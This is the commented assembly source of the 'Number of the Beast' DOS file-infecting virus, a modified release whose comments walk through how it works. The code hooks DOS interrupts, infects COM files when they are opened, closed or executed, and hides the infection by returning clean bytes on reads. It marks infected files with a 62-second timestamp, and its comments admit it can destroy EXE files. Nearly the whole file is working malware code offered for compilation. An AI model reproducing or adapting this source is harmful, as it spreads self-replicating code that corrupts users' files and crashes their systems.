;*******************************************************************************
;*									       *
;*			THE NUMBER OF THE BEAST VIRUS			       *
;*									       *
;*	This is NOT a original virus, but a modification. Main difference      *
;*	between original virus is, that this release support ANY DOS version   *
;*	above 3.00 and below 4.00 (3.10, 3.20 and 3.30).		       *
;*									       *
;*	     Modification (C) were made by				       *
;*									       *
;*	Kiril Stoimenov & Stephen Genchev				       *
;*									       *
;*		Source was (C) commented by				       *
;*	Waleri Todorov, CICTT, 07 Mar 1991    20:30			       *
;*									       *
;*	All Rights Reserved.						       *
;*									       *
;*******************************************************************************
;*									       *
;*	We don't care about any damages caused by compiling and runnig         *
;*	of this program. Use it only at your responsible !		       *
;*									       *
;*	If you find any mistakes or inaccurates in this source or comments,    *
;*	please, let us know. Drop message for Waleri Todorov on Virus eXchange *
;*	BBS, (+359+2) 20-41-98 or send Email to FidoNet 2:359/105.100	       *
;*									       *
;*						Waleri Todorov		       *
;*									       *
;*******************************************************************************
		org	0

		mov	ah,30h		; Get DOS version
		int	21h
		xchg	ah,al		; Swap major and minor digit
		cmp	ax,31Eh 	; Is DOS==3.30
		mov	si,7B4h 	; Load offset of original int13
		jae	newdos		; If 3.30+ -> Proceed
		mov	si,10A5h	; Load offset of original int13
		cmp	al,10		; Check for 3.10
		je	newdos		; If so -> proceed
		mov	si,1EC9h	; Load offset of original int13 for other DOS's
	newdos: mov	ds,cx		; This may cause trouble, because CX
					; is NOT allways set to ZERO
		mov	di,0F8h 	; ES:DI will point to PSP:00F8 - unused area
		movsw		; Save oroginal int13 vector
		movsw		; to unused area in PSP
		mov	si,84h	; DS:SI point to 0000:0084 - int21 vector
		movsw		; Save current int21 vector
		movsw		; to unused area in PSP
		lds	ax,dword ptr [si-4]	; Load DS:AX with current address of int21
		push	es	; Save ES
		push	di	; Save DI
		mov	si,8	; DS:SI point in current int21 handler;
		mov	ch,1	; CX=100h - As I said CX is not allways set to 0
		repz	cmpsw	; Check if virus v512 hold the int21 vector
		push	cs	;
		pop	ds	; Set DS to PSP
		jz	SkipInstall	; If virus is active -> SkipInstall

		mov	ah,52h
		int	21h	; Get DOS table of table address
		push	es	; Save segment of table
		mov	si,00F8h	; DS:SI point virus WITH data area in PSP
		sub	di,di	; This will be offset in DOS buffer
		les	ax,dword ptr es:[bx+12h]	; Load address of first
						; DOS buffer from table of tables
						; This is the reason why virus
						; will NOT work on DOS 4.X+

		mov	dx,es:[di+02]		; Load in DX segment of next DOS buffer
		mov	cx,0104h	; CX set to virus size (208h bytes)
		repz	movsw		; Move itself in DOS buffer
		mov	ds,cx		; Now CX is 0 so DS also become 0
		mov	di,0016h	; This will be used for finding parent PSP
		mov	word ptr [di+06Eh],offset int21+8	; Set new int21 offset
		mov	[di+70h],es	; Set new int21 segment

		pop	ds	; Restore segment of table in DS
		mov	[bx+14h],dx	; Set pointer to first buffer point NEXT buffer in chain

		mov	dx,cs		; DX is current PSP segment
		mov	ds,dx		; DS also
		mov	bx,[di-14h]	; Load LAST segment available
		dec	bh		; LastSegment-=0x0100
		mov	es,bx		; ES point in transit COMMAND.COM area
		cmp	dx,[di] 	; Compare current PSP with COMMAND's parent PSP
		mov	ds,[di] 	; Load in DS segment of parent of COMMAND
		mov	dx,[di] 	; Load in DX parent of parent of COMMAND
		dec	dx		; Decrement loaded segment
		mov	ds,dx		; Set DS to rezult
		mov	si,cx		; DS:SI point to XXXX:0000 -> Name of boot command
		mov	dx,di		; Save DI in DX
		mov	cl,28h		; Will move 80 bytes
		repz	movsw		; Do moving
		mov	ds,bx		; Set DS to transit COMMAND.COM segment

		jb	RunProcess	; If current process is less than parent
					; then COMMAND strat in progress -> read original bytes

		int	20h		; Else stop. File will run from decond start
					; If this instruction will be replaced by
					; PUSH CS; POP DS file will run from first time

SkipInstall:	mov	si,cx		; Set SI to 0
		mov	ds,[si+02Ch]	; Load in DS segment of envirement
SearchAgain:	lodsw			; Load word from envirement
		dec	si		; Decrement envirement pointer
		test	ax,ax		; Test for zero in AX
		jnz	SearchAgain	; If not zero -> SearchAgain
		add	si,3		; Else SI+=3; Now DS:SI point to filename in env
		mov	dx,si		; DS:DX point to filename for open
RunProcess:	mov	ah,03Dh 	; AH = 3D - Open file; Don't care about open mode
		call	CallDosGet	; Call int21 & get handle table address in DS:DI
		mov	dx,[di] 	; Load file size in DX
		mov	[di+04],dx	; Set file pointer to end of file
		add	[di],cx 	; Increase file size with 512 bytes
		pop	dx		; Restore file entry point (100h) to DX
					; This used for reading original bytes
					; of file at normal place
		push	dx		; Save entry point again
		push	cs		; Set ES point to virus segment
		pop	es		;
		push	cs		; Set DS point to virus segment
		pop	ds		;
		push	ds		; Save PSP segment
		mov	al,50h		; Push 50h. On stack is far address PSP:0050
					; This are INT 21; RETF instructions
		push	ax		; Update returning address
		mov	ah,03Fh 	; Set AH=3F - read file
		retf			; Far return; Read original file
					; and return control to it
CallDosGet:	int	21h		; Open file; Open procedure will go trough virus
		jc	ErrorOpen	; If error occur -> Skip open
		mov	bx,ax		; Move file pointer in BX
					; This could be XCHG AX,BX; that save 1 byte

GetHandleAddr:	push	bx		; Save file handle in stack
		mov	ax,1220h	; Get handle's table number
		int	02Fh		; Via int 2F (undocumented)
		mov	bl,es:[di]	; Load table number in BL
		mov	ax,1216h	; Get handle table ADDRESS (ES:DI)
		int	02Fh		; Via int 2F (undocumented)
		pop	bx		; Restore file handle from stack
		push	es		; Set DS to point table's segment
		pop	ds		;
		add	di,11h		; DI will point file's size entry intable
		mov	cx,0200h	; CX set to virus size
ErrorOpen:	ret
ReadClean:	sti		; Disable external interrupts request
		push	es	; Save important registers to stack
		push	si
		push	di
		push	bp
		push	ds	; Data buffer segment
		push	cx	; Bytes to read
		call	GetHandleAddr	; Get file handle's table address in DS:DI
		mov	bp,cx		; Save virus size in BP
		mov	si,[di+04]	; Save in SI current file pointer
		pop	cx		; Restore bytes to be readed in CX
		pop	ds		; Restore buffer segment
		call	ReadOriginal	; Open file with original int21
		jc	SkipClean	; If error while read -> skip cleaning
		cmp	si,bp		; Check if file pointer was in virus
		jnb	SkipClean	; If no -> nothing to clean
		push	ax		; Save readed bytes
		mov	al,es:[di-04]	; Load AL with file time
		not	al		;
		and	al,01Fh 	; Mask seconds of file time
		jnz	SkipCleanPop	; If time is NOT 31 sec -> nothing to do
		add	si,es:[di]	; Add to current pointer file size
					; Now SI point to requested offset,
					; BUT in original file bytes

		xchg	si,es:[di+04]	; Set new file pointer and save old file pointer
		add	es:[di],bp	; Increase file size with virus size
		call	ReadOriginal	; Open file via original int21
		mov	es:[di+04],si	; Restor file pointer
		lahf			; ??? I don't know. If you do let me know
		sub	es:[di],bp	; Decrease file size with virus size
		sahf			; ??? I don't know. If you do let me know
SkipCleanPop:	pop	ax	; Restore readed bytes

SkipClean:	pop	bp	; Restore saved imortant register
		pop	di
		pop	si
		pop	es
		db	0CAh, 2, 0	; RETF 2

ReadOriginal:	mov	ah,03Fh
CallDOS:	pushf
		push	cs
		call	JumpDOS
		ret
; Following few bytes are int21 handler. They check if file is open close or
; executed and clean or infect file with virus. Here there is serious problem -
; from time to time virus infect file which is NOT COM file (EXE file will be
; destroyed, by the way).
;	More about this later in comments


int21:		cmp	ah,03Fh 	; If function is Read file
		jz	ReadClean	; then go and read original bytes

		push	ds		; Save important registers
		push	es
		push	ax
		push	bx
		push	cx
		push	dx
		push	si
		push	di
		cmp	ah,03Eh 	; If function is Close file
		jz	CloseInfect	; then Close and Infect
		cmp	ax,04B00h	; If execute file
		mov	ah,03Dh 	; then open file before execute
					; After opening file will be closed
					; and .... Infected
		jz	Infect		;
TerminateInt:	pop	di		; Restore important registers
		pop	si
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		pop	es
		pop	ds
JumpDOS:	jmp	dword ptr cs:[0004]	; Jump to original int21

CloseInfect:	mov	ah,45h
Infect: 	call	CallDosGet	; Duplicate file handler
		jc	TerminateInt	; If error -> terminate
		sub	ax,ax		; Set AX to 0
		mov	[di+04],ax	; Set file pointer to 0
		mov	byte ptr [di-0Fh],02	; Set file open mode to Read/Write
		cld
		mov	ds,ax		; Set DS point to interrupt table
		mov	si,004Ch	; SI point to int13 offset
		lodsw		; Load int13 offset
		push	ax	; and save it in stack
		lodsw		; Load int13 segment
		push	ax	; and save it in stack
		push	[si+40h]	; Save int24 offset
		push	[si+42h]	; Save int24 segment
		lds	dx,dword ptr cs:[si-50h]	; Load DS:DX with BIOS int13
		mov	ax,2513h	; and set it via DOS function SetVector
		int	21h		;
		push	cs		; Set DS point to virus segment
		pop	ds		;
		mov	dx,offset int24+8	; Load in DX offset of int24 handler
		mov	al,24h		; Set int24 vector
		int	21h		; via DOS function SetVector
		push	es		; Set DS point to handle table segment
		pop	ds		;
		mov	al,[di-04]	; Load AL with file time

; As I said in some case virus will infect non-COM file. This may happend
; if file you work with has time set to 62 seconds. In this case virus infect
; file without checking filename. This WILL damage EXE file. DOS will treat
; this files as COM files, but usualy their size is bigger than 64K, so DOS
; cannot run it. If file is less than 64K then virus run and read original
; bytes. Usualy he DO read them, then skip control to these bytes. In EXE
; files this is EXEheader, so execution FAIL (your system CRASH)


		and	al,01Fh 	; Mask seconds
		cmp	al,01Fh 	; Check if seconds == 31 (62sec)
		jz	NoNameCheck	; If so -> infect with no name check
		mov	ax,[di+17h]	; Load AX with first 2 letters of file extension
		sub	ax,04F43h	; If file is NOT *.CO?
		jnz	SkipInfect	; SkipInfect

NoNameCheck:	xor	[di-04],al	; Set file seconds to 31 (62sec)
		mov	ax,[di] 	; Set AX to file size
		cmp	ax,cx		; Check file size and virus size
		jb	SkipInfect	; If file is less than 512 bytes -> Don't infect
		add	ax,cx		; Increase file size with virus size
		jc	SkipInfect	; If file is bigger than (65535-512) -> no infect
		test	byte ptr [di-0Dh],04	; Check file attribute
		jnz	SkipInfect	; If SYSTEM file -> don't infect it
		lds	si,dword ptr [di-0Ah]	; Load DS:SI with device header
		dec	ax	; AX (file size with virus) --
		shr	ah,1	; AX/=2
		and	ah,[si+04]	; Check if enough place in cluster behind file
		jz	SkipInfect	; If no place -> terminate infection
		mov	ax,0020h	; DS = 20 (Second part of int table)
		mov	ds,ax		;
		sub	dx,dx		; DS:DX point to virus transfer buffer
		call	ReadOriginal	; Open file with original int21
		mov	si,dx		; Save virus buffer offset in SI
		push	cx		; Save virus size
LoopCheck:	lodsb
		cmp	al,cs:[si+07]	; Compare readed data with virus code
		jnz	WriteFile	; If at least ONE byte different -> fuck file
		loop	LoopCheck	; Check all virus code with buffer
		pop	cx		; Restore virus size
SetFileTime:	or	byte ptr es:[di-04],01Fh	; Set file time to 62sec
NoUpdateTime:	or	byte ptr es:[di-0Bh],40h	; Set flag in device info word

			; In case of file this is flag area. Setting bit 14
			; as virus does, mean for DOS "Don't set file date/time when close"
	; DOS always rewrite Date/Time field of table. If bit 14 is clear (0)
	; then DOS will set current time to file. Virus should avoid this, or
	; DOS will overwrite seconds field and they (seconds) will be normal

SkipInfect:	mov	ah,03Eh 	; Close file
		call	CallDOS 	; via original int21
		or	byte ptr es:[di-0Ch],40h	; Set flag... See above
		pop	ds		; Restore original int24
		pop	dx
		mov	ax,2524h	; via SetVector
		int	21h
		pop	ds		; Restore original int13
		pop	dx
		mov	al,13h		; via SetVector
		int	21h
		jmp	TerminateInt	; All done, jump to DOS

WriteFile:	pop	cx		; Restore virus size to CX
		mov	si,es:[di]	; Save current file size in SI
		mov	es:[di+04],si	; Move file pointer at the end of file
		mov	ah,40h		; Write to file its first 512  bytes at the end
		int	21h
		jc	NoUpdateTime	; If error occur file time will be normal
		mov	es:[di],si	; Set file size to be as before (file size
						; will remain unchanged)
		mov	es:[di+04],dx	; Set file pointer to beginning of file
		push	cs		; Set DS:DX point to virus
		pop	ds		;
		mov	dl,08		; Skip first 8 bytes of virus, because they
					; are a buffer for int handlers adresses
		mov	ah,40h		; Write virus at the beginning of file
		int	21h		;
		jmp	SetFileTime	; File now OK infected, so his time must be
					; set to 62 sec
	int24:	iret			; int 24 handler. Avoid "Write protected error..."
		db     '666'            ; Virus signature
